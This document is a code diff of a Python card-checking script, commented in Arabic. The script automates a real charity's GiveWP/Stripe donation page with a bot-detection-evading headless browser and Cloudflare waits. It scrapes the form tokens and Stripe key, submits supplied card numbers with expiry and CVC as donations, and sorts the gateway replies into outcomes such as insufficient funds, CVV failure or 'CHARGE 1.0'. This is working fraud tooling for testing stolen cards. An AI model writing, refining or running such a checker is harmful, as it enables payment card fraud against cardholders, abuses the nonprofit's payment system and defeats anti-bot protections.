@@ -7,51 +7,149 @@ import requests
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
 
-# ═══════════════════════════════════════════════════════════
-# ATTEMPT 1: undetected-chromedriver
-# ═══════════════════════════════════════════════════════════
 
-def try_undetected_chromedriver(url, card_number, exp_month, exp_year, cvc):
-    """المحاولة الأولى: undetected-chromedriver"""
-    print("\n" + "="*60)
-    print("🎯 ATTEMPT 1: undetected-chromedriver")
-    print("="*60)
+def setup_selenium_driver(headless=True):
+    """إعداد Selenium Chrome - الطريقة اللي كانت شغالة"""
+    options = Options()
     
+    if headless:
+        options.add_argument('--headless=new')
+    
+    # ═══ Performance ═══
+    options.add_argument('--no-sandbox')
+    options.add_argument('--disable-dev-shm-usage')
+    options.add_argument('--disable-gpu')
+    options.add_argument('--disable-setuid-sandbox')
+    options.add_argument('--disable-software-rasterizer')
+    options.add_argument('--window-size=1920,1080')
+    options.add_argument('--log-level=3')
+    
+    # ═══ Anti-detection ═══
+    options.add_argument('--disable-blink-features=AutomationControlled')
+    options.add_argument('--disable-features=IsolateOrigins,site-per-process')
+    options.add_experimental_option("excludeSwitches", ["enable-automation"])
+    options.add_experimental_option('useAutomationExtension', False)
+    
+    # ═══ User-Agent حقيقي ═══
+    options.add_argument(
+        'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
+    )
+    
+    # ═══ Page Load Strategy ═══
+    options.page_load_strategy = 'eager'
+    
+    # ═══ Cookies + Profile ═══
+    prefs = {
+        "profile.managed_default_content_settings.images": 2,
+        "profile.default_content_setting_values.notifications": 2,
+        "profile.default_content_settings.popups": 0,
+        "credentials_enable_service": False,
+        "profile.password_manager_enabled": False,
+    }
+    options.add_experimental_option("prefs", prefs)
+    
+    # ═══ Driver ═══
+    driver = None
+    
+    # محاولة 1: System ChromeDriver
     try:
-        import undetected_chromedriver as uc
-    except ImportError:
-        print("❌ undetected-chromedriver not installed")
-        return None
+        if os.path.exists('/usr/bin/chromedriver'):
+            print("✅ Using system chromedriver")
+            service = Service('/usr/bin/chromedriver')
+            if os.path.exists('/usr/bin/chromium'):
+                options.binary_location = '/usr/bin/chromium'
+                print("✅ Using system chromium")
+            driver = webdriver.Chrome(service=service, options=options)
+    except Exception as e:
+        print(f"⚠️ System driver failed: {e}")
+    
+    # محاولة 2: webdriver-manager
+    if driver is None:
+        try:
+            from webdriver_manager.chrome import ChromeDriverManager
+            service = Service(ChromeDriverManager().install())
+            driver = webdriver.Chrome(service=service, options=options)
+            print("✅ Using webdriver-manager")
+        except Exception as e:
+            print(f"⚠️ webdriver-manager failed: {e}")
+    
+    # محاولة 3: Default
+    if driver is None:
+        driver = webdriver.Chrome(options=options)
+        print("✅ Using default Chrome")
+    
+    # ═══ Anti-Detection Scripts ═══
+    driver.execute_cdp_cmd('Network.setUserAgentOverride', {
+        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
+    })
+    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+    driver.execute_script("Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]})")
+    driver.execute_script("Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']})")
+    
+    driver.set_page_load_timeout(30)
+    driver.set_script_timeout(30)
+    driver.implicitly_wait(2)
+    
+    return driver
+
+
+def check_givewp_stripe(url, card_number, exp_month, exp_year, cvc):
+    """فحص GiveWP + Stripe"""
+    print("=" * 60)
+    print(f"🎯 Checking: {url}")
+    print("=" * 60)
     
     driver = None
     try:
-        # ═══ Options ═══
-        options = uc.ChromeOptions()
-        options.add_argument('--no-sandbox')
-        options.add_argument('--disable-dev-shm-usage')
-        options.add_argument('--disable-gpu')
-        options.add_argument('--window-size=1920,1080')
-        options.add_argument('--disable-blink-features=AutomationControlled')
-        
-        # Headless
-        # options.add_argument('--headless=new')  # ← سيبها مشغلة الأول للتشخيص
-        
-        # User-Agent حقيقي
-        options.add_argument(
-            'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
-        )
-        
-        # ═══ Launch ═══
-        print("🚀 Launching undetected Chrome...")
-        driver = uc.Chrome(options=options, version_main=None, use_subprocess=True)
+        # ═══ Setup Driver ═══
+        print("🚀 Launching Chrome...")
+        driver = setup_selenium_driver(headless=True)
+        print("✅ Chrome launched")
         
         # ═══ Open Page ═══
         print(f"🌐 Opening: {url}")
         driver.get(url)
-        time.sleep(10)  # استنى Cloudflare
         
-        # ═══ Check ═══
+        # ═══ Smart Wait for Cloudflare ═══
+        print("⏳ Waiting for page + Cloudflare...")
+        
+        max_wait = 30
+        start_time = time.time()
+        page_ready = False
+        
+        while time.time() - start_time < max_wait:
+            try:
+                html = driver.page_source
+                html_lower = html.lower()
+                
+                # Check for Cloudflare Challenge
+                if 'just a moment' in html_lower or 'checking your browser' in html_lower:
+                    print("   ⚠️ Cloudflare challenge detected, waiting...")
+                    time.sleep(3)
+                    continue
+                
+                # Check for GiveWP form
+                if 'give-form-id' in html or 'givewp' in html_lower:
+                    page_ready = True
+                    break
+                
+                # Check page length
+                if len(html) > 5000:
+                    page_ready = True
+                    break
+                
+                time.sleep(1)
+            except:
+                time.sleep(1)
+        
+        # ═══ Final Check ═══
         current_url = driver.current_url
         title = driver.title
         html = driver.page_source
@@ -60,49 +158,64 @@ def try_undetected_chromedriver(url, card_number, exp_month, exp_year, cvc):
         print(f"📍 Title: {title}")
         print(f"📄 Source length: {len(html)}")
         
-        # Cloudflare check
+        # ═══ Wait for Cloudflare more if needed ═══
         html_lower = html.lower()
         if 'just a moment' in html_lower or 'checking your browser' in html_lower:
-            print("⚠️ Cloudflare Challenge still active")
-            time.sleep(15)  # استنى أطول
+            print("⚠️ Cloudflare still active, waiting 20s more...")
+            time.sleep(20)
             html = driver.page_source
-            if 'just a moment' in html.lower():
-                print("❌ Cloudflare Challenge - FAILED")
-                return {'status': 'CLOUDFLARE_CHALLENGE'}
-        
-        if 'access denied' in html_lower or '403 forbidden' in html_lower:
-            print("❌ 403 Forbidden")
-            return {'status': 'ACCESS_DENIED_403'}
+            html_lower = html.lower()
+            if 'just a moment' in html_lower:
+                return "CLOUDFLARE_CHALLENGE"
         
         # ═══ Extract Form Data ═══
-        from selenium.webdriver.common.by import By
-        
         form_id = None
         form_hash = None
         form_prefix = None
         stripe_key = None
         
+        # طريقة 1: find_elements
         try:
-            form_id_els = driver.find_elements(By.NAME, "give-form-id")
-            if form_id_els:
-                form_id = form_id_els[0].get_attribute("value")
-        except: pass
+            els = driver.find_elements(By.NAME, "give-form-id")
+            if els:
+                form_id = els[0].get_attribute("value")
+        except:
+            pass
         
         try:
-            form_hash_els = driver.find_elements(By.NAME, "give-form-hash")
-            if form_hash_els:
-                form_hash = form_hash_els[0].get_attribute("value")
-        except: pass
+            els = driver.find_elements(By.NAME, "give-form-hash")
+            if els:
+                form_hash = els[0].get_attribute("value")
+        except:
+            pass
         
         try:
-            form_prefix_els = driver.find_elements(By.NAME, "give-form-id-prefix")
-            if form_prefix_els:
-                form_prefix = form_prefix_els[0].get_attribute("value")
-        except: pass
+            els = driver.find_elements(By.NAME, "give-form-id-prefix")
+            if els:
+                form_prefix = els[0].get_attribute("value")
+        except:
+            pass
         
-        stripe_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', html)
-        if stripe_match:
-            stripe_key = stripe_match.group(0)
+        # طريقة 2: من HTML
+        if not form_id:
+            m = re.search(r'name="give-form-id"\s+value="(\d+)"', html)
+            if m:
+                form_id = m.group(1)
+        
+        if not form_hash:
+            m = re.search(r'name="give-form-hash"\s+value="([a-f0-9]+)"', html)
+            if m:
+                form_hash = m.group(1)
+        
+        if not form_prefix:
+            m = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
+            if m:
+                form_prefix = m.group(1)
+        
+        # Stripe Key
+        m = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', html)
+        if m:
+            stripe_key = m.group(0)
         
         print(f"✅ Form ID: {form_id}")
         print(f"✅ Form Hash: {form_hash}")
@@ -110,13 +223,12 @@ def try_undetected_chromedriver(url, card_number, exp_month, exp_year, cvc):
         print(f"✅ Stripe Key: {stripe_key}")
         
         if not form_id or not form_hash:
-            print("❌ Missing form data")
-            return {'status': 'MISSING_FORM_DATA', 'html_len': len(html)}
+            return f"MISSING_FORM_DATA (len={len(html)})"
         
-        # ═══ Generate Stripe PM via JS ═══
+        # ═══ Generate Stripe PM ═══
         print("💳 Generating Stripe Payment Method...")
         
-        js_script = """
+        stripe_js = """
         var callback = arguments[arguments.length - 1];
         var stripeKey = arguments[0];
         var cardNum = arguments[1];
@@ -126,20 +238,19 @@ def try_undetected_chromedriver(url, card_number, exp_month, exp_year, cvc):
         
         (async () => {
             try {
-                // Load Stripe.js
                 if (typeof Stripe === 'undefined') {
                     await new Promise((resolve, reject) => {
                         const s = document.createElement('script');
                         s.src = 'https://js.stripe.com/v3/';
                         s.onload = resolve;
-                        s.onerror = () => reject(new Error('Failed to load Stripe.js'));
+                        s.onerror = () => reject(new Error('Stripe.js load failed'));
                         document.head.appendChild(s);
                     });
                     await new Promise(r => setTimeout(r, 2000));
                 }
                 
                 if (typeof Stripe === 'undefined') {
-                    callback(JSON.stringify({error: 'Stripe.js not loaded'}));
+                    callback(JSON.stringify({error: 'Stripe.js not available'}));
                     return;
                 }
                 
@@ -185,9 +296,8 @@ def try_undetected_chromedriver(url, card_number, exp_month, exp_year, cvc):
         """
         
         try:
-            driver.set_script_timeout(30)
             result_raw = driver.execute_async_script(
-                js_script,
+                stripe_js,
                 stripe_key,
                 card_number,
                 exp_month,
@@ -195,7 +305,7 @@ def try_undetected_chromedriver(url, card_number, exp_month, exp_year, cvc):
                 cvc
             )
             
-            print(f"📥 Stripe response: {result_raw[:300]}")
+            print(f"📥 Stripe: {result_raw[:300]}")
             
             pm_data = json.loads(result_raw)
             
@@ -205,17 +315,16 @@ def try_undetected_chromedriver(url, card_number, exp_month, exp_year, cvc):
                 code = pm_data.get('code', '')
                 
                 if decline:
-                    return {'status': f'STRIPE_{decline.upper()}', 'error': error}
+                    return f"STRIPE_{decline.upper()}: {error[:100]}"
                 if code:
-                    return {'status': f'STRIPE_{code.upper()}', 'error': error}
-                return {'status': f'STRIPE_ERROR', 'error': error}
+                    return f"STRIPE_{code.upper()}: {error[:100]}"
+                return f"STRIPE_ERROR: {error[:100]}"
             
             pm_id = pm_data.get('pm_id')
             print(f"✅ PM ID: {pm_id}")
             
             # ═══ Get Cookies ═══
             cookies = driver.get_cookies()
-            cookie_dict = {c['name']: c['value'] for c in cookies}
             print(f"✅ Got {len(cookies)} cookies")
             
             # ═══ POST Donation ═══
@@ -225,7 +334,7 @@ def try_undetected_chromedriver(url, card_number, exp_month, exp_year, cvc):
             session.verify = False
             
             for c in cookies:
-                session.cookies.set(c['name'], c['value'], domain=c.get('domain', '.higherhopesdetroit.org'))
+                session.cookies.set(c['name'], c['value'])
             
             donation_url = f'https://higherhopesdetroit.org/donation/?payment-mode=stripe&form-id={form_id}'
             
@@ -271,34 +380,20 @@ def try_undetected_chromedriver(url, card_number, exp_month, exp_year, cvc):
                 'content-type': 'application/x-www-form-urlencoded',
                 'origin': 'https://higherhopesdetroit.org',
                 'referer': 'https://higherhopesdetroit.org/donation/',
-                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-fetch-dest': 'document',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-user': '?1',
-                'upgrade-insecure-requests': '1',
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
             }
             
             response = session.post(donation_url, data=data, headers=headers, timeout=30)
             
-            print(f"📥 POST response: {response.status_code}, len={len(response.text)}")
+            print(f"📥 POST: {response.status_code}, len={len(response.text)}")
             
-            return {
-                'status': parse_donation_response(response.text, response.status_code),
-                'pm_id': pm_id,
-                'cookies_count': len(cookies)
-            }
+            return parse_donation_response(response.text, response.status_code)
         
         except Exception as e:
-            print(f"❌ Stripe.js error: {e}")
-            return {'status': f'STRIPE_JS_ERROR: {str(e)[:80]}'}
+            return f"Stripe JS Error: {str(e)[:100]}"
     
     except Exception as e:
-        print(f"❌ Error: {e}")
-        return {'status': f'ERROR: {str(e)[:100]}'}
+        return f"Main Error: {str(e)[:150]}"
     
     finally:
         if driver:
@@ -308,30 +403,23 @@ def try_undetected_chromedriver(url, card_number, exp_month, exp_year, cvc):
                 pass
 
 
-# ═══════════════════════════════════════════════════════════
-# Parse Response
-# ═══════════════════════════════════════════════════════════
-
 def parse_donation_response(text, status_code):
-    """تحليل الرد من GiveWP"""
+    """تحليل الرد"""
     text_lower = text.lower()
     
     live_map = {
         'insufficient_funds': 'INSUFFICIENT_FUNDS',
-        'insufficient funds': 'INSUFFICIENT_FUNDS',
         'your card has insufficient funds': 'INSUFFICIENT_FUNDS',
         'card was declined': 'DECLINED',
         'your card was declined': 'DECLINED',
         'expired_card': 'EXPIRED_CARD',
         'your card has expired': 'EXPIRED_CARD',
         'suspected fraud': 'SUSPECTED_FRAUD',
-        'fraudulent': 'SUSPECTED_FRAUD',
         'incorrect_cvc': 'CVV_FAILURE',
         'security code is incorrect': 'CVV_FAILURE',
         'incorrect_number': 'INVALID_CARD_NUMBER',
         'card number is incorrect': 'INVALID_CARD_NUMBER',
         'do_not_honor': 'DO_NOT_HONOR',
-        'transaction_not_allowed': 'TRANSACTION_NOT_ALLOWED',
         'processing_error': 'PROCESSING_ERROR',
         'thank you': 'CHARGE 1.0',
         'success': 'CHARGE 1.0',
@@ -341,7 +429,6 @@ def parse_donation_response(text, status_code):
         if kw in text_lower:
             return resp
     
-    # JSON
     if text.strip().startswith('{'):
         try:
             data = json.loads(text)
@@ -355,23 +442,14 @@ def parse_donation_response(text, status_code):
         except:
             pass
     
-    # Search error in HTML
     matches = re.findall(r'"error[^"]*"\s*:\s*"([^"]+)"', text)
     if matches:
         return f"ERROR: {matches[0][:100]}"
-    
-    match = re.search(r'(error[:\s]+[^<\n]{5,150})', text_lower)
-    if match:
-        return f"ERROR: {match.group(1)[:100]}"
     
     if status_code == 200:
         return f"UNKNOWN_200: {text[:200].strip()}"
     return f"HTTP_{status_code}"
 
-
-# ═══════════════════════════════════════════════════════════
-# Run
-# ═══════════════════════════════════════════════════════════
 
 if __name__ == '__main__':
     url = 'https://higherhopesdetroit.org/donation/'
@@ -380,12 +458,11 @@ if __name__ == '__main__':
     parts = card.split('|')
     card_number = parts[0]
     exp_month = parts[1]
-    exp_year = parts[2][-2:]  # YY
+    exp_year = parts[2][-2:]
     cvc = parts[3]
     
-    # ═══ Try undetected-chromedriver ═══
-    result = try_undetected_chromedriver(url, card_number, exp_month, exp_year, cvc)
+    result = check_givewp_stripe(url, card_number, exp_month, exp_year, cvc)
     
-    print("\n" + "="*60)
+    print("\n" + "=" * 60)
     print(f"📊 FINAL RESULT: {result}")
-    print("="*60)
+    print("=" * 60)
